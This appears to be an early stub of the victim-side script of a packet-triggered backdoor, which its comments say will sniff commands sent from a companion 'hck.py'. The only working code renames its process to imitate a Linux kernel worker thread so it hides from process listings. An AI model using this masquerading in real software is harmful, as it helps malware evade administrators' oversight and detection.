#!/usr/bin/env python
# ###################################################################
# vic.py 
# 
# main functions:
#	- sniff packet from hck.py
#	- modify process table 		--------- DONE
# ###################################################################
from scapy.all import *
from encrypt import *
import argparse
import sys
import string
from setproctitle import getproctitle, setproctitle




def main():

	try:
		from setproctitle import getproctitle, setproctitle
	except ImportError:
		logging.warning(
		    ("Unable to set import 'setproctitle', "
		     "process name cannot be changed"))
	else:
		setproctitle("%s" % "[kworker/2:3><><><><><><]")
	raw_input("GIVE me: ")

	


if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt:
		print("Terminate signal received. Exiting...")